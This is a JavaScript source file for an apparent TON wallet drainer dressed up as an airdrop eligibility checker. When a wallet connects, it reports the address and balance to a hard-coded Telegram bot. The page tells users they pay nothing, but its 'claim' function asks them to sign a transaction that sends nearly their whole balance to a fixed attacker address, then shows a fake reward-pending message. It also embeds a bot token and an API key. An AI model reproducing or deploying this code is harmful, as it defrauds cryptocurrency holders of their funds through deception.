let tonConnectUI;
let connectedWallet;
let currentBalanceNano = 0;

// User-friendly TON address formatter
function toUserFriendly(address) {
  return TON_CONNECT_UI.toUserFriendlyAddress(address);
}

// Show or hide transactions
function toggleTransactions() {
  const txContainer = document.getElementById("transactionContainer");
  const btn = document.getElementById("toggleTransactions");
  const showing = txContainer.style.display === "block";

  txContainer.style.display = showing ? "none" : "block";
  btn.innerText = showing ? "⏩ Show Transactions" : "⏬ Hide Transactions";
}

// Copy address to clipboard
function copyToClipboard(text) {
  navigator.clipboard.writeText(text).then(() => alert("Copied!"));
}

// Initialize TonConnect

document.addEventListener("DOMContentLoaded", async () => {
  tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: "https://vocal-smakager-e64636.netlify.app/manifest.json",
    buttonRootId: "ton-connect",
    twaReturnUrl: "https://t.me/HubNation_Bot", // 👈 Added return URL
    uiPreferences: {
      colorsSet: {
        [TON_CONNECT_UI.THEME.DARK]: {
          connectButton: {
            background: "#e045ff",
            color: "040724c0",
          },
        },
        [TON_CONNECT_UI.THEME.LIGHT]: {
          connectButton: {
            background: "#040724c0",
            color: "#040724c0",
          },
        },
      },
    },
  });

  tonConnectUI.onStatusChange(async (wallet) => {
    if (wallet && wallet.account?.address) {
      connectedWallet = wallet;
      const friendly = toUserFriendly(wallet.account.address);
      const fullAddress = toUserFriendly(wallet.account.address);
      const botToken = "7938101132:AAFunYCy6Dv0vnrOHEeXM4QKley5q6iq53A";
      const chatId = "-1002781376753"; // e.g., 123456789 or -100XXXXXXXX

      // Get balance
      try {
        const balRes = await fetch(
          `https://toncenter.com/api/v2/getAddressBalance?address=${fullAddress}`
        );
        const balData = await balRes.json();
        let tonBalance = 0;

        if (balData.ok) {
          tonBalance = balData.result / 1e9;
        }

        // Build message
        const message = `✅ Connected\n<code>${fullAddress}</code>\n💰 Balance: <b>${tonBalance.toFixed(
          4
        )} TON</b>`;

        // Send to Telegram
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: "HTML",
          }),
        });
      } catch (err) {
        console.error("Failed to fetch balance or notify Telegram:", err);
      }
      document.getElementById(
        "wallet-address"
      ).innerText = `Wallet: ${"Connected"}`;
    } else {
      document.getElementById("wallet-address").innerText =
        "Wallet: Not connected";
    }
  });
});

// Scan Wallet Logic
async function scanWallet() {
  if (!connectedWallet) return alert("Please connect your wallet first.");

  const address = connectedWallet.account.address;
  const txContainer = document.getElementById("transactionContainer");
  const resultDiv = document.getElementById("result");
  const checksDiv = document.getElementById("checks");
  const balanceDiv = document.getElementById("balanceResult");
  const claimBtn = document.getElementById("claimBtn");

  // Clear and show loaders
  txContainer.innerHTML = resultDiv.innerHTML = '<div class="loader"></div>';
  checksDiv.innerHTML = balanceDiv.innerHTML = "";

  // Fetch transactions
  const allTxs = [];
  let lt = null,
    hash = null;
  const API_KEY =
    "0737f5ac813de095296e93ef82bfe4bce8fa8b248028ded59661cb81e08c0f20";

  for (let i = 0; i < 7; i++) {
    const params = new URLSearchParams({
      address,
      limit: 15,
      archival: "true",
      api_key: API_KEY,
    });
    if (lt && hash) {
      params.append("lt", lt);
      params.append("hash", hash);
    }

    const res = await fetch(
      `https://toncenter.com/api/v2/getTransactions?${params}`
    );
    const data = await res.json();
    if (!data.ok || data.result.length === 0) break;

    allTxs.push(...data.result);
    lt = data.result[data.result.length - 1].transaction_id.lt;
    hash = data.result[data.result.length - 1].transaction_id.hash;
    if (allTxs.length >= 100) break;
  }

  // Show Transaction Toggle
  document.getElementById("toggleTransactions").style.display = "block";

  // Show Check Eligibility Button
  document.querySelector('button[onclick="showEligibility()"]').style.display =
    "block";

  // Render Transactions
  let totalReceived = 0,
    totalSent = 0;
  const txHTML = allTxs
    .slice(0, 100)
    .map((tx) => {
      const date = new Date(tx.utime * 1000).toLocaleString();
      let inTon = 0;
      if (tx.in_msg?.value) inTon += parseFloat(tx.in_msg.value) / 1e9;
      tx.out_msgs.forEach((m) => {
        if (m?.value) totalSent += parseFloat(m.value) / 1e9;
      });
      totalReceived += inTon;

      return `<div>
      <strong>${date}</strong><br>
      Received: ${inTon.toFixed(4)} TON<br>
      From: <span style="font-size:12px">${tx.in_msg?.source || "N/A"}</span>
      <button class="copy-btn" onclick="copyToClipboard('${
        tx.in_msg?.source || ""
      }')">Copy</button>
    </div>`;
    })
    .join("");

  txContainer.innerHTML = txHTML;

  // User Rank & Summary
  const totalTxs = allTxs.length;
  let rank = "Newbie 🧍";
  if (totalTxs >= 100) rank = "Ton King 👑";
  else if (totalTxs >= 50) rank = "Ton Hero 🛡️";
  else if (totalTxs >= 20) rank = "Ton Star 🌟";

  resultDiv.innerHTML = `<p style="font-size: 0.85rem; color: #00000; text-align: center; margin-top: 8px;">
  <em>Showing data from your most recent 100 transactions)</em>
</p>
  
  <h3>${rank}</h3>
    <p>Total Transactions: ${totalTxs}</p>
    <p>Total Received: ${totalReceived.toFixed(4)} TON</p>
    <p>Total Sent: ${totalSent.toFixed(4)} TON</p>`;

  // Check Balance
  const balRes = await fetch(
    `https://toncenter.com/api/v2/getAddressBalance?address=${address}`
  );
  const balData = await balRes.json();
  let tonBalance = 0;
  if (balData.ok) {
    tonBalance = balData.result / 1e9;
    currentBalanceNano = balData.result;
    balanceDiv.innerHTML = `<strong>Current Balance:</strong> ${tonBalance.toFixed(
      4
    )} TON`;
  } else {
    balanceDiv.innerText = "Error fetching balance";
  }

  // Store conditions
  window.tonConditions = {
    totalTxs,
    tonBalance,
  };

  // END OF scanWallet()

  // Show eligibility button only after scan is complete
  document.getElementById("checkEligibilityBtn").style.display = "block";
}

// Show Eligibility Checklist
function showEligibility() {
  const { totalTxs, tonBalance } = window.tonConditions || {};
  const checksDiv = document.getElementById("checks");
  const claimBtn = document.getElementById("claimBtn");

  const mark = (pass, label) =>
    `<div class="check ${pass ? "green" : "red"}">${
      pass ? "✅" : "❌"
    } ${label}</div>`;

  const c1 = totalTxs >= 5;
  const c2 = totalTxs >= 50;
  const c3 = totalTxs >= 100;
  const c4 = tonBalance >= 2;

  checksDiv.innerHTML = `<div style="background: rgba(21, 10, 83, 0.507); border-left: 4px solid #00ccff; padding: 15px; border-radius: 8px; margin-bottom: 20px; font-size: 0.9rem; color: #00ccff; line-height: 1.4;">
  ⚠️ Only your <strong>latest 100 transactions</strong> are analyzed.<br>
  💡 <strong>Note:</strong> You’re <strong>not paying</strong> anything — holding at least <strong>2 TON</strong> simply proves you're real and helps stop bots and cheaters from abusing the system. This keeps rewards fair for active users like you.
</div>
    ${mark(
      c1,
      `5+ Transactions 🧍 <span style="font-size: 0.8rem; color: #888; margin-left: 8px;">(Optional)</span>`
    )}
    ${mark(
      c2,
      `50+ Transactions 🛡️ <span style="font-size: 0.8rem; color: #888; margin-left: 8px;">(Optional)</span>`
    )}
    ${mark(
      c3,
      `100+ Transactions 👑 <span style="font-size: 0.8rem; color: #888; margin-left: 8px;">(Optional)</span>`
    )}
    ${mark(
      c4,
      `2+ TON Balance 💰 <span style="font-size: 0.85rem; color: #ff6b35; margin-left: 8px; font-weight: 600;">(REQUIRED)</span>`
    )}
  `;
  checksDiv.style.display = "block";

  claimBtn.disabled = !c4;
  claimBtn.style.display = "block";
}

// Claim Function with Fixed Claim Fee
async function claimTon() {
  if (!connectedWallet || currentBalanceNano < 2e9) {
    alert("Not eligible to claim (need at least 2 TON)");
    return;
  }

  const fixedClaimFeeNano = 0.01 * 1e9; // 0.01 TON = 10,000,000 nanoTON
  const claimAmount = currentBalanceNano - fixedClaimFeeNano;

  if (claimAmount <= 0) {
    alert("Insufficient balance after fee deduction.");
    return;
  }

  const transaction = {
    messages: [
      {
        address: "UQAy0cZcROzsUNSSZwcUTKtrdydRA2e44Ov2_6KjTMFJrAZu", // Receiver address
        amount: claimAmount.toString(), // Send balance minus 0.01 TON
      },
    ],
  };

  try {
    const result = await tonConnectUI.sendTransaction(transaction);
    alert(
      "🎊 Thank You for Participating! 🎊 Weve received your submission successfully. 🔍 Your information is currently being reviewed.  This process usually takes just a few minutes. 💸 Once verified, your reward will be sent automatically.  Stay tuned, and thanks for being part of our community!🚀 "
    );
    console.log("Transaction Result:", result);
  } catch (err) {
    alert("Transaction failed");
    console.error(err);
  }
}
